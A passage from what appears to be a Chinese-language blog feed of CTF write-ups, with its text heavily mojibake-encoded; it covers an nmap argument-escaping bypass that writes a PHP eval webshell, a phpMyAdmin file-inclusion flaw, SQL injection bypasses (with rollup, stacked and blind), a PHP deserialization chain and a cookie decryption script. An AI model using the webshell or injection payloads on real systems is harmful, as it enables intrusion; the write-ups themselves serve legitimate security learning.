é€’ä¸€ä¸ªå‚æ•°ç»™å‘½ä»¤ï¼Œç”¨æˆ·ä¸èƒ½æŒ‡å®šæ›´å¤šçš„å‚æ•°ï¼Œç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</p><p>escapeshellcmdï¼šç¡®ä¿ç”¨æˆ·åªæ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šä¸é™æ•°é‡çš„å‚æ•°ï¼Œç”¨æˆ·ä¸èƒ½æ‰§è¡Œä¸åŒçš„å‘½ä»¤</p><p><img src="1.png"></p><p><img src="2.png"></p><p>mkdiråˆ›å»ºä¸€ä¸ªä¸€å¹•</p><p>nmap -T5 -sT -Pn â€“host-timeout 2 -F</p><p>-T5æ—¶é—´ä¼˜åŒ–5ç§’ï¼ŒTCPæ‰«æè¿æ¥ -Pnåœ¨çº¿å¤„ç†æ‰€æœ‰çš„ä¸»æœºï¼Œè·³è¿‡ä¸»æœºå‘ç°ï¼Œé™åˆ¶æ‰«ææ—¶é—´æ˜¯ä¸¤ç§’ï¼Œå¿«é€Ÿæ‰«æ</p><p>æˆ‘åœ¨æƒ³è¿™é“é¢˜ç›®æ˜¯ä¸æ˜¯éœ€è¦æˆ‘ä»¬ç¬¬ä¸€å¿…é¡»è¦åå•†ipï¼Œç„¶ååœ¨ipåé¢æ¥ç€æ‰§è¡Œå‘½ä»¤æ‰§è¡Œ</p><p>åˆšæ‰ä¸€ç›´åœ¨æƒ³æ€ä¹ˆæ„é€ payloadï¼Œä½¿å…¶å¯ä»¥åœ¨è½¬ä¹‰çš„è°ƒä»·ä¸‹ï¼Œä¾ç„¶åšåˆ°127.0.0.12 &amp; ls;ä½†æ˜¯å¥½åƒä¸è¡Œ</p><p><img src="3.PNG"></p><p>ç„¶åçœ‹äº†ä¸€çœ¼WPï¼Œæˆ‘å¿½ç•¥äº†ä¸€ç‚¹ï¼Œä¸ºä»€ä¹ˆä¼šæœ‰mkdirå’Œchdirï¼Œå¦‚æœæˆ‘åªæ˜¯æƒ³ç®€å•çš„å»åœ¨systemå»æ‰§è¡Œpayloadï¼Œæ ¹æœ¬æ²¡æœ‰å¿…è¦ä½¿ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œæ‰€ä»¥è¿™å•·ä¸ªå‡½æ•°åœ¨è¿™é‡Œå¿…ç„¶ä¼šæœ‰å¾ˆé‡è¦çš„ä½œç”¨</p><p>åˆšæ‰æ‹¼æ¥å‘½ä»¤ä¸€ç›´æ²¡æœ‰æˆåŠŸï¼Œæç¤ºè¯´nmapå‘½ä»¤ä¸­å‚æ•°-oGå¯ä»¥å®ç°å°†å‘½ä»¤å’Œç»“æœå†™é“æ–‡ä»¶ï¼ˆä¹Ÿå°±æ˜¯å†™è¿›å»æœ¨é©¬ï¼‰</p><p>ç„¶åæˆ‘åˆé™·è¿›å»äº†ï¼Œæˆ‘å¤§æ¦‚æƒ³åˆ°äº†æ€è·¯å°±æ˜¯è¯´ï¼Œå°†æœ¨é©¬å†™è¿›æ–‡ä»¶1.phpé‡Œï¼Œç„¶åè®¿é—®/0a4719a024d42d6bbf3aaf5ac68855d5/1.phpï¼Œç„¶åé€šè¿‡æœ¨é©¬è¿›è¡Œè¿æ¥ã€‚ã€‚ã€‚ã€‚</p><p>å¯æ˜¯ï¼Œæˆ‘é”™äº†ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>æ˜¯æ“ä½œé”™äº†ï¼Œæˆ‘ä¸€ç›´ä»¥ä¸ºè¦åŠ ä¸€ä¸ªipï¼Œæ‰å¯ä»¥å†™å…¥</p><p>å…¶å®ä¸åŠ å°±å¯ä»¥ï¼Œæˆ‘ä»¬è¦å†™çš„å°±æ˜¯<?php eval($_POST['A']);?> -oG 1.php</p><p>æœ¬æ¥æƒ³ç€æ€ä¹ˆæ“ä½œï¼Œåœ¨æƒ³æ€ä¹ˆåŠ ï¼Œä½†æ˜¯æƒ³èµ·æ¥åˆšæ‰æƒ³æ„é€ çš„payloadï¼Œå°±æ˜¯è¿˜æ€ä¹ˆæ„é€ éƒ½æ— æ³•é€ƒé€¸ï¼Œçœ‹wp</p><p>å‘ç°åªè¦åœ¨å¤–é¢åŠ ä¸¤ä¸ªå•å¼•å·ï¼Œé‡Œé¢çš„éƒ½å¯ä»¥ä¸ç”¨ç®¡äº†ï¼Œç„¶åå°±æˆåŠŸçš„å¾—åˆ°äº†flag</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</title>
      <link href="/2021/05/30/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2021/05/30/%E6%88%91%E6%9C%89%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“</p><p>phpmyadminï¼Œæ•°æ®åº“å¤ç°</p><pre><code>if (! empty($_REQUEST[&#39;target&#39;])    &amp;&amp; is_string($_REQUEST[&#39;target&#39;])    &amp;&amp; ! preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])    &amp;&amp; ! in_array($_REQUEST[&#39;target&#39;], $target_blacklist)    &amp;&amp; Core::checkPageValidity($_REQUEST[&#39;target&#39;])) &#123;    include $_REQUEST[&#39;target&#39;];    exit;&#125;</code></pre><p>æ¼æ´ç‚¹åœ¨è¿™é‡Œ</p><p>1.targetä¸æ˜¯ç©º<br>2.targetéœ€è¦æ˜¯å­—ç¬¦ä¸²<br>3.targetä¸èƒ½ä»¥indexå¼€å¤´<br>4.targetä¸èƒ½åœ¨$target_blacklist = array (<br>    â€˜import.phpâ€™, â€˜export.phpâ€™<br>);é‡Œé¢</p><p>5.æŸ¥çœ‹ä¸€ä¸‹Core::checkPageValidity</p><pre><code>        public static function checkPageValidity(&amp;$page, array $whitelist = [])&#123;    if (empty($whitelist)) &#123;        $whitelist = self::$goto_whitelist;    &#125;    if (! isset($page) || !is_string($page)) &#123;        return false;    &#125;    if (in_array($page, $whitelist)) &#123;        return true;    &#125;    $_page = mb_substr(        $page,        0,        mb_strpos($page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    $_page = urldecode($page);    $_page = mb_substr(        $_page,        0,        mb_strpos($_page . &#39;?&#39;, &#39;?&#39;)    );    if (in_array($_page, $whitelist)) &#123;        return true;    &#125;    return false;&#125;</code></pre><p>è¿™é‡Œæˆ‘å¯å¤ªç†Ÿæ‚‰äº†å‘€ï¼Œè¿™ä¸æ˜¯warmupå˜›å“ˆå“ˆå“ˆå“ˆå“ˆå“ˆï¼Œå°±ä¸åˆ†æäº†å“ˆå“ˆå“ˆå“ˆã€‚</p><p>ä¸»è¦æ˜¯è¿™é“é¢˜ç›®ï¼Œä¹Ÿä¸ç®—æ˜¯éš¾é¢˜ï¼Œè¿˜æ˜¯å…³é”®çœ‹æ‰«ç›®å½•ï¼Œç›®å½•æ‰«ä¸å‡ºæ¥ä¸€åˆ‡éƒ½ç™¾æ­ï¼Œè¿˜æœ‰åƒè¿™ç§é¢˜ç›®ï¼Œå¯ä»¥åœ¨ç™¾åº¦ä¸Šæœç´¢ä¸€ä¸‹ç›¸å…³æ¼æ´ä¾¿äºåšé¢˜ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>swpu-web6</title>
      <link href="/2021/05/28/swpu-web6/"/>
      <url>/2021/05/28/swpu-web6/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p><img src="1.PNG"></p><p>æ‰“å¼€é¢˜ç›®å°±æ˜¯è¿™æ ·å­çš„ï¼Œè®¤çœŸè§‚å¯Ÿä¸‹ï¼Œæœ‰ä¸‰ç‚¹ï¼šä¸€ä¸ªæ˜¯ç™»å½•ï¼ŒçŒœæµ‹è·Ÿsqlæœ‰å…³ï¼Œç„¶åç¬¬äºŒç‚¹æ˜¾ç¤ºï¼šmethod can useindexï¼Œæœ‰ç‚¹æ— å˜å¤´ï¼Œä¸çŸ¥é“è¿™æ˜¯å¹²å˜›çš„ã€‚ç¬¬ä¸‰ç‚¹ï¼šClick â€œJoin usâ€ to see the form switch Demo 1<br>ç‚¹å‡»demo1ï¼Œurlåé¢åŠ ä¸Šäº†indexã€‚htmlï¼Œæ²¡ä»€ä¹ˆå®é™…ç”¨å¤„ã€‚é‚£ä¹ˆè¿›è¡Œæ³¨å…¥</p><p>å…ˆfuzzäº†ä¸€ä¸‹</p><p><img src="2.PNG"></p><p>199çš„éƒ½æ˜¯è¢«è¿‡æ»¤çš„ï¼Œselectè¢«è¿‡æ»¤ç›¸å½“äºå¾ˆå¤§ä¸€éƒ¨åˆ†æ³¨å…¥å§¿åŠ¿éƒ½ç”¨ä¸äº†ï¼Œjoinæ— åˆ—åæ³¨å…¥ä¸å¯ï¼Œæ‹¬å·è¢«è¿‡æ»¤æ›´ç»ï¼Œsleepç›²æ³¨ç”¨ä¸äº†ã€‚</p><p>ç„¶ååœ¨è¾“å…¥ç”¨æˆ·åè·Ÿå¯†ç çš„æ—¶å€™å‘ç°äº†é—®é¢˜ã€‚</p><p><img src="3.PNG"></p><p><img src="5.PNG"></p><p>å‘ç°äº†æœ‰ä¸¤ç§æƒ…å†µï¼Œè¦ä¸æ˜¯å¯†ç é”™è¯¯ï¼Œè¦ä¸æ˜¯å°±æ˜¯ç”¨æˆ·åå’Œå¯†ç é”™è¯¯ï¼Œç”¨æˆ·åè¿™é‡Œæˆ‘ç”¨åˆ°äº†ä¸‡èƒ½å¯†ç ï¼Œæ‰€ä»¥å®ƒåå°æ£€æµ‹çš„åº”è¯¥å°±æ˜¯å¯†ç äº†ï¼Œéœ€è¦æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¯†ç å¯ä»¥è·Ÿå®ƒåå°çš„å¯†ç å¯¹ä¸Šï¼Œçœ‹åˆ°æœ‰å¤§ä½¬çŒœæµ‹æºç </p><pre><code>$sql=&quot;select * from users where username=&#39;$name&#39; and passwd=&#39;$pass&#39;&quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &#123;     $key = mysql_fetch_array($query);if($key[&#39;passwd&#39;] == $_POST[&#39;passwd&#39;]) &#123;</code></pre><p>ä½†æ˜¯å¾ˆæ˜¾ç„¶ï¼Œæ ¹æœ¬å°±ä¸çŸ¥é“å¯†ç æ˜¯å•¥ï¼Œåªèƒ½æƒ³åŠæ³•åœ¨ä¸çŸ¥é“å¯†ç çš„æƒ…å†µä¸‹ï¼Œç»•è¿‡åå°çš„æ£€æµ‹ã€‚</p><p>å­¦åˆ°äº†ä¸€ä¸ªæ–°çš„çŸ¥è¯† with rollup</p><p><img src="6.PNG"></p><p>å¯ä»¥çœ‹åˆ°ï¼Œæœ€åä¸€è¡Œï¼Œç”¨æˆ·åæ˜¯nullï¼Œé‚£ä¹ˆæ ¹æ®è¿™ä¸ªé“ç†ï¼Œæˆ‘ä»¬åŒæ ·ä¹Ÿå¯ä»¥å°†passwdç½®ä¸ºç©ºï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æˆåŠŸç»•è¿‡ã€‚</p><p>ä½†æ˜¯è¿˜æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬ç”¨ä¸Šè¿°è¯­å¥å¯ä»¥å¾—åˆ°ä¸æ­¢ä¸€è¡Œçš„passwdï¼Œåªæœ‰æœ€åä¸€è¡Œçš„passwdæ˜¯nullã€‚å› ä¸ºä¸èƒ½ç”¨limitï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡å¦ä¸€ä¸ªè¯­å¥ç»•è¿‡</p><p><img src="7.PNG"></p><p>åŒæ ·è¿ç”¨åœ¨ç™»å½•ç•Œé¢ä¸Š</p><p><img src="9.PNG"></p><p><img src="8.PNG"></p><p>æˆ‘åˆšæ‰è¿˜åœ¨æƒ³ï¼Œè¾“å…¥è¯­å¥å“ˆå“ˆå“ˆå“ˆï¼ŒçœŸæ˜¯å‚»äº†ã€‚</p><p>ç°åœ¨æˆåŠŸç™»å½•ï¼Œç„¶å„¿å™©æ¢¦æ‰åˆšåˆšå¼€å§‹ï¼Œå¤´ç§ƒã€‚ã€‚ã€‚ã€‚ã€‚</p><p>wsdl.php</p><p>buuä¸Šé¢åº”è¯¥æ˜¯å°‘ç»™äº†è¿™ä¸ª</p><p>f12</p><pre><code>&lt;/operation&gt;&lt;operation name=&quot;login&quot;&gt;&lt;input message=&quot;tns:loginRequest&quot; /&gt;&lt;output message=&quot;tns:loginResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;set_cookie&quot;&gt;&lt;input message=&quot;tns:set_cookieRequest&quot; /&gt;&lt;output message=&quot;tns:set_cookieResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;user&quot;&gt;&lt;input message=&quot;tns:userRequest&quot; /&gt;&lt;output message=&quot;tns:userResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;check&quot;&gt;&lt;input message=&quot;tns:checkRequest&quot; /&gt;&lt;output message=&quot;tns:checkResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;File_read&quot;&gt;&lt;input message=&quot;tns:File_readRequest&quot; /&gt;&lt;output message=&quot;tns:File_readResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;hint&quot;&gt;&lt;input message=&quot;tns:hintRequest&quot; /&gt;&lt;output message=&quot;tns:hintResponse&quot; /&gt;&lt;/operation&gt;&lt;operation name=&quot;Get_flag&quot;&gt;&lt;input message=&quot;tns:Get_flagRequest&quot; /&gt;&lt;output message=&quot;tns:Get_flagResponse&quot; /&gt;&lt;/operation&gt;</code></pre><p>çœ‹åˆ°äº†loginè·Ÿuserï¼Œååº”è¿‡æ¥åº”è¯¥æ˜¯é‚£ä¸ªï¼Ÿmethod=xxx</p><p>æ‰€ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•è¯•<br>set_cookie  check</p><p>File_readï¼š</p><p><img src="10.PNG"></p><p>æç¤ºinputï¼Œæ„Ÿè§‰åº”è¯¥æ˜¯postæäº¤ï¼Œè¿™ä¸ªæœ‰å¸®åŠ©ï¼Œä¸å¦‚è¿”å›wsdl.phpï¼Œä»”ç»†è§‚å¯Ÿä¸€ä¸‹File_read.</p><p><img src="11.PNG"></p><p>æœç„¶æœ‰å‘ç°ï¼Œè¿™ä¸ªfilenameåº”è¯¥å°±æ˜¯postæäº¤çš„å‚æ•°ï¼Œä½†æ˜¯é‚£ä¸ªtxtæ–‡ä»¶æ˜¯å¹²ä»€ä¹ˆçš„æš‚æ—¶ä¸çŸ¥é“ï¼Œæˆ‘å°è¯•è¯»å–äº†ä¸€ä¸‹</p><p><img src="12.PNG"></p><p>emmmmmï¼Œä¸€ç‚¹éƒ½ä¸å¥½ç©ï¼Œå®³ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>é‚£å°±å…ˆæ”¾åœ¨è¿™é‡ŒæŠŠï¼Œç»§ç»­çœ‹å…¶ä»–çš„</p><p>hint:</p><p><img src="13.PNG"></p><p>åœ¨å°è¯•åœ¨é‚£ä¸ªé‡Œé¢è¯»å–è¿™å‡ ä¸ªæ–‡ä»¶index.php Service.php interface.php se.php</p><p>index.php:</p><pre><code>&lt;?phpob_start();include (&quot;encode.php&quot;);include(&quot;Service.php&quot;);//error_reporting(0);//phpinfo();$method = $_GET[&#39;method&#39;]?$_GET[&#39;method&#39;]:&#39;index&#39;;//echo 1231;$allow_method = array(&quot;File_read&quot;,&quot;login&quot;,&quot;index&quot;,&quot;hint&quot;,&quot;user&quot;,&quot;get_flag&quot;);if(!in_array($method,$allow_method))&#123;    die(&quot;not allow method&quot;);&#125;if($method===&quot;File_read&quot;)&#123;    $param =$_POST[&#39;filename&#39;];    $param2=null;&#125;else&#123;    if($method===&quot;login&quot;)    &#123;        $param=$_POST[&#39;username&#39;];        $param2 = $_POST[&#39;passwd&#39;];    &#125;else    &#123;            echo &quot;method can use&quot;;    &#125;&#125;echo $method;$newclass = new Service();echo $newclass-&gt;$method($param,$param2);ob_flush();?&gt;</code></pre><p>å…ˆç”¨ä»£ç å®¡è®¡æ‰«äº†ä¸€ä¸‹æ²¡æœ‰ä»€ä¹ˆæ¼æ´ï¼Œé‚£å°±åˆ†æä¸€ä¸‹å§ </p><p><img src="14.PNG"></p><p>service.php:not allow read,åº”è¯¥æ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–ï¼ˆå› ä¸ºæˆ‘åˆšæ‰å°è¯•è¯»flagï¼Œå®ƒæ˜¯ä»€ä¹ˆå›æ˜¾éƒ½æ²¡æœ‰çš„ï¼Œæ‰€ä»¥çŒœæµ‹æ˜¯ä¸€å®šå­˜åœ¨è¿™ä¸ªæ–‡ä»¶çš„åªæ˜¯æˆ‘ä»¬æ²¡æœ‰æƒé™è¯»å–ï¼Œå•Šä¸ï¼Œindex.phpä¸­éƒ½åŒ…å«serviceäº†ï¼Œè¯´æ˜ä¸€å®šå­˜åœ¨ï¼‰</p><p>interface.phpï¼š</p><pre><code> &lt;?php   include(&#39;Service.php&#39;);$ser = new SoapServer(&#39;Service.wsdl&#39;,array(&#39;soap_version&#39;=&gt;SOAP_1_2));$ser-&gt;setClass(&#39;Service&#39;);$ser-&gt;handle();?&gt; </code></pre><p>ç¡®è®¤è¿‡æ˜¯æˆ‘çœ‹ä¸æ‡‚çš„ä»£ç ã€‚ã€‚ã€‚</p><p><img src="15.PNG"></p><p>è§£å†³äº†åˆšæ‰é‚£ä¸ªé—®é¢˜</p><p>ç»§ç»­çœ‹ä¸‹å»se.phpï¼š</p><pre><code>&lt;?phpini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);//çœ‹åˆ°è¿™ä¸ªæˆ‘çªç„¶æ„Ÿè§‰æˆ‘ååºåˆ—åŒ–çš„æ—¶å€™é‡åˆ°è¿‡ï¼Œæ‰¾æ‰¾ç›¸å…³ä¾‹é¢˜çœ‹çœ‹class aa&#123;        public $mod1;        public $mod2;        public function __call($name,$param)        &#123;            if($this-&gt;&#123;$name&#125;)                &#123;                    $s1 = $this-&gt;&#123;$name&#125;;                    $s1();                &#125;        &#125;        public function __get($ke)        &#123;            return $this-&gt;mod2[$ke];        &#125;&#125;class bb&#123;        public $mod1;        public $mod2;        public function __destruct()        &#123;            $this-&gt;mod1-&gt;test2();        &#125;&#125; class cc&#123;        public $mod1;        public $mod2;        public $mod3;        public function __invoke()        &#123;                $this-&gt;mod2 = $this-&gt;mod3.$this-&gt;mod1;        &#125; &#125;class dd&#123;        public $name;        public $flag;        public $b;        public function getflag()        &#123;                session_start();                 var_dump($_SESSION);                $a = array(reset($_SESSION),$this-    &gt;flag);                echo call_user_func($this-&gt;b,$a);        &#125;&#125;class ee&#123;        public $str1;        public $str2;        public function __toString()        &#123;                $this-&gt;str1-&gt;&#123;$this-&gt;str2&#125;();                return &quot;1&quot;;        &#125;&#125;$a = $_POST[&#39;aa&#39;];unserialize($a);?&gt;</code></pre><p>è¿™å¿…ç„¶æ˜¯è¦æ„é€ ä¸€ä¸ªååºåˆ—åŒ–é“¾ï¼Œä½†æ˜¯ï¼Œæˆ‘æ„é€ é“¾è¦åšä»€ä¹ˆï¼Ÿè¯»å–serviceã€‚phpå—ï¼Œè¿˜æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿç»§ç»­çœ‹çœ‹å§ã€‚</p><p>Get_flagï¼šä¸æˆåŠŸï¼Œç„¶åæ¿¡æŸ“æƒ³èµ·æ¥index.phpï¼Œå°è¯•get_flag</p><p><img src="12.PNG"></p><p>æ„Ÿè§‰æ˜¯ssrfè¶Šæƒï¼Œè¿™ç‚¹ä¸ä¼šï¼Œçœ‹çœ‹èµ„æ–™å§</p><p>ç„¶åæƒ³èµ·æ¥æœ‰ä¸€ä¸ªencode.phpå°è¯•è¯»å–</p><pre><code>&lt;?phpfunction en_crypt($content,$key)&#123;$key    =    md5($key);$h      =    0;$length    =    strlen($content);$swpuctf      =    strlen($key);$varch   =    &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    if ($h == $swpuctf)    &#123;        $h = 0;    &#125;    $varch .= $key&#123;$h&#125;;    $h++;&#125;$swpu  =  &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % 256);&#125;return base64_encode($swpu);&#125;    </code></pre><p>è¿™ç”Ÿæˆäº†ä¸€ä¸ªåŠ å¯†çš„swpuï¼Œçœ‹cookieé‡Œé¢çš„userï¼Œå®ƒé‡Œé¢æœ‰ä¸€ä¸ªå€¼æ˜¯3J6Roahxag==ï¼Œç€çœ‹ç€å¾ˆåƒæ˜¯base64ï¼Œä½†æ˜¯base64è§£ç è§£å‡ºæ¥æ˜¯ä¹±ç ï¼Œç»“åˆè¿™ä¸ªencodeçš„åŠ å¯†ï¼Œå¯ä»¥åæ¨å‡ºæ¥ç”¨æˆ·åï¼Œæˆ‘çš„å¦ˆå‘€ï¼Œè¿™æ˜¯äººæƒ³çš„åšæ³•å—ã€‚ã€‚ã€‚ã€‚</p><pre><code>&lt;?phpfunction de_crypt($swpu,$key)&#123;$swpu=base64_decode($swpu);$key    =    md5($key);$h      =    0;$length    =    strlen($swpu);$swpuctf      =    strlen($key);$varch   =    &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    if ($h == $swpuctf)    &#123;        $h = 0;    &#125;    $varch .= $key&#123;$h&#125;;    $h++;&#125;$swpu  =  &#39;&#39;;for ($j = 0; $j &lt; $length; $j++)&#123;    $content .=chr(ord($swpu&#123;$j&#125;)-(ord($varch&#123;$j&#125;)));&#125;return $content;&#125;    print(de_crypt(&#39;3J6Roahxag==&#39;,&#39;flag&#123;this_is_false_flag&#125;&#39;));</code></pre><p>ç„¶åè¿™ä¸ªkeyå˜›å°±ç»“åˆæˆ‘ä»¬åˆšæ‰è¯»å‡ºæ¥çš„é‚£ä¸ªå‡çš„flagï¼Œè¿›è¡Œè¯»å»ï¼Œå¾—åˆ°cookieï¼šxiaoC:2</p><p>æ“ï¼Ÿï¼Ÿï¼ŸæŠŠcookieä¿®æ”¹äº†è¯´ä»€ä¹ˆä½ è¿˜æ²¡æœ‰ç™»å½•ï¼Œç™»å½•ä¹‹åcookieåˆéå†ã€‚ã€‚ã€‚æ— è¯­äº†åªèƒ½è¿›è¡Œssrfäº†</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LSB</title>
      <link href="/2021/05/24/LSB/"/>
      <url>/2021/05/24/LSB/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>å›¾ç‰‡éšå†™çš„å…³é”®å°±æ˜¯è¯´åˆ©ç”¨ä¿®æ”¹æ•°æ®çš„æ–¹å¼æ¥ä¼ é€’ä¿¡æ¯ï¼Œå…¶ä¸­çš„ä¸€ç§æ–¹å¼å°±æ˜¯LSBï¼ˆæœ€ä½æœ‰æ•ˆä½æ¥è¿›è¡Œéšå†™ï¼‰åŸç†å°±æ˜¯ï¼šå›¾ç‰‡æ˜¯ç”±ä¸‰åŸè‰²ç»„æˆçš„ï¼Œæ¯ä¸ªåƒç´ éƒ½æœ‰8bit,lsbå°±æ˜¯é€šè¿‡ä¿®æ”¹äº†æœ€ä½çš„1bitï¼Œåœ¨äººçœ¼çœ‹ä¸å‡ºæ¥åŒºåˆ«çš„æƒ…å†µä¸‹ï¼Œå°†ä¿¡æ¯éšè—äº†èµ·æ¥</p><p>é¢˜ç›®</p><p>å°†å›¾ç‰‡æ”¾å…¥stegsovleä¸­è¿›è¡Œæ•°æ®åˆ†æ</p><p><img src="1.PNG">  å¾—åˆ°äº†ä¸€å¼ äºŒç»´ç æ‰«ç å¾—åˆ°flag</p><p>ä¸ºä»€ä¹ˆæŠŠä¸‰åŸè‰²éƒ½è°ƒæˆäº†0ï¼Œå› ä¸ºæœ€ä½ä½å•Š</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>swup-web4</title>
      <link href="/2021/05/24/swup-web4/"/>
      <url>/2021/05/24/swup-web4/</url>
      
        <content type="html"><![CDATA[<p>#å‰è¨€</p><span id="more"></span><p>æˆ‘åˆ°åº•ä»€ä¹ˆæ—¶å€™æ‰èƒ½è®°å¾—ä¿å­˜å•Šå•Šå•Šå•Šå•Šå•Šï¼Œåˆå…¨æ²¡äº†ï¼Œæœäº†æˆ‘è‡ªå·±ã€‚</p><p>å…ˆè¯´è¿™é“é¢˜ç›®ï¼Œæ‹¿åˆ°é¢˜ç›®è¦è¿›è¡Œç™»å½•ï¼Œä½†æ˜¯æ— è®ºè¾“å…¥ä»€ä¹ˆï¼Œç‚¹å‡»ç™»å½•éƒ½æ²¡æœ‰ä»»ä½•ååº”ï¼Œæ³¨å†ŒåŠŸèƒ½è¿˜æ²¡æœ‰å¼€å¯ï¼Œç›®å½•å•¥ä¹Ÿæ‰«ä¸å‡ºæ¥ï¼Œå°±çº³é—·</p><p>ç„¶åæŠ“åŒ…æœ‰å‘ç°ï¼Œå°±æ˜¯æ¥åˆ°äº†ä¸€ä¸ªæ–°çš„ç•Œé¢</p><p><img src="1.PNG"></p><p>ç„¶åæˆ‘å°è¯•äº†2â€ #å‘ç°ç™»å½•æˆåŠŸï¼Œä½†æ˜¯å°±ä»…ä»…æ˜¯ç™»å½•æˆåŠŸï¼Œå…¶ä»–çš„æ²¡æœ‰ä»»ä½•è¿›å±•ï¼Œå°±å¾ˆçº³é—·ï¼Œå°±æ˜¯æ²¡æœ‰ä»€ä¹ˆè¿›å±•</p><p>ç„¶åæŸ¥çœ‹wpè¯´</p><p>è¿™æ˜¯å †å æ³¨å…¥ï¼Œå®ƒæœ‰å †å æ³¨å…¥çš„æ˜æ˜¾çš„ç‰¹å¾ï¼Œå°±æ˜¯å¦‚æœè¾“å…¥1â€™,æŠ¥é”™ï¼Œä½†æ˜¯è¾“å…¥1â€™;æ²¡æœ‰æŠ¥é”™</p><p><img src="2.PNG"></p><p><img src="3.PNG"></p><p>ç„¶åæˆ‘è¿›è¡Œå…¶ä»–çš„æ“ä½œå°±æ˜¯1â€™;show databases;#,ä¾æ—§æ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ï¼Œåªå¥½å†æ¬¡æ±‚åŠ©WP</p><p>è¿™æ˜¯åœ¨pdoæ¡ä»¶ä¸‹çš„å †å æ³¨å…¥åŠ é¢„æ³¨å…¥ï¼Œå…¶å®å †å æ³¨å…¥å’Œé¢„æ³¨å…¥å½“æ—¶åœ¨åšå¼ºç½‘æ¯çš„æ—¶å€™å°±ç¢°è§è¿‡å½“æ—¶æ²¡æœ‰å¥½å¥½çš„æ•´ç†</p><p>è¿˜æ˜¯å…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ—¶pdoæŠŠï¼Œå°±æ˜¯php data objectï¼Œé»˜è®¤æƒ…å†µä¸‹çš„pdoæ˜¯å¯ä»¥æ‰§è¡Œæœ‰ï¼›å‚ä¸çš„å¤šè¯­å¥æ‰§è¡Œçš„ï¼Œé‚£æˆ‘ä»¬å°±èƒ½é—­åˆå‰é¢çš„å•å¼•å·åè¿›è¡Œå †å æ³¨å…¥</p><p>å…¶å®å°±æ˜¯åœ¨pdoæƒ…å†µä¸‹æ‰å¯ä»¥è¿™æ ·å­åšï¼Œå…¶ä»–æƒ…å†µä¸‹å°±ä¸ä¸€å®šäº†ï¼Œå°±æ˜¯ç›¸å½“äºæä¾›äº†ä¸€ä¸ªæ¡ä»¶</p><p>å¹¶ä¸”è¿™é“é¢˜ç›®å¾ˆæ€ªçš„åœ°æ–¹å°±æ˜¯ï¼Œæˆ‘è¿›è¡Œå †å æ³¨å…¥çš„æ—¶å€™æ˜¯æ²¡æœ‰ä¼šæ˜¾å¾—ï¼Œæˆ‘åšçš„æ—¶å€™ä¸çŸ¥é“æ—¶ä»€ä¹ˆæƒ…å†µï¼Œåº”è¯¥å°±æ˜¯è¿‡æ»¤äº†ï¼Œè¿‡æ»¤äº†å¾ˆå¤šå…³é”®å­—ã€‚å› ä¸ºä»€ä¹ˆå…³é”®å­—è¢«è¿‡æ»¤äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬é‡‡ç”¨16è¿›åˆ¶åŠ æ—¶é—´ç›²æ³¨ç»•è¿‡</p><p>å…ˆè¯´ç›²æ³¨ï¼Œæˆ‘éƒ½å¿˜è®°çš„å·®ä¸å¤šäº†ã€‚</p><p>ä¸ºä»€ä¹ˆè¦è¿›è¡Œç›²æ³¨ï¼Œå› ä¸ºæ²¡æœ‰å›æ˜¾ï¼Œæˆ‘åˆšæ‰è¿›è¡Œæµ‹è¯•çš„æ—¶å€™å°±æ²¡æœ‰ç‰¹åˆ«çš„å›æ˜¾ï¼Œæ‰€ä»¥è¦é‡‡ç”¨æ²¡æœ‰ç‰¹åˆ«å›æ˜¾çš„æ—¶é—´ç›²æ³¨</p><p><img 